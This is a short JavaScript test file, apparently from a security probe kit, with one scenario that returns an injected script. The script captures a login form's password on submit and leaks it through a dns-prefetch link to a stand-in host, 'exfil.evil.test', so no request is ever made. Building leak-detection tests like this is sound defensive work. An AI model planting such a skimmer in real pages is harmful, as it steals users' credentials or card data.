// Attack: the card digits leaked in a dns-prefetch host name, with no request at all.
import { scenario } from './probe-kit.js';

export const respond = scenario(() => `document.getElementById('login').addEventListener('submit', function () {
  var digits = document.getElementById('password').value.replace(/[^a-z0-9]/gi, '').toLowerCase();
  var l = document.createElement('link'); l.rel = 'dns-prefetch'; l.href = '//' + digits + '.exfil.evil.test'; document.head.appendChild(l);
});`);
